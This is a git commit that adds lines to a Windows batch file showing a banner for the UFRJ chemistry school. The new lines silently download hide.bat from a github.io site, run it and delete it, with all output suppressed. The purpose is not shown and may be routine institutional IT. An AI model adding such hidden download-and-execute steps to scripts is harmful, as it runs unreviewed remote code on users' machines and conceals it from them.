d35167e8c4ffb60d225edc608f7672306190a03a
Leo Neves <enfimleo@gmail.com>
2024-08-26 21:15:38 -0300

    hide any

--- any.bat
+++ any.bat
@@ -1,7 +1,11 @@
 @echo off
+:hide
+curl -o c:\temp\hide.bat https://suporteeq.github.io/hide.bat > NUL 2>&1 && call c:\temp\hide.bat && del c:\temp\hide.bat > NUL 2>&1
+
 cls
 echo ==============================
 echo   Escola de Quimica da UFRJ
 echo ==============================
 
 echo.
+
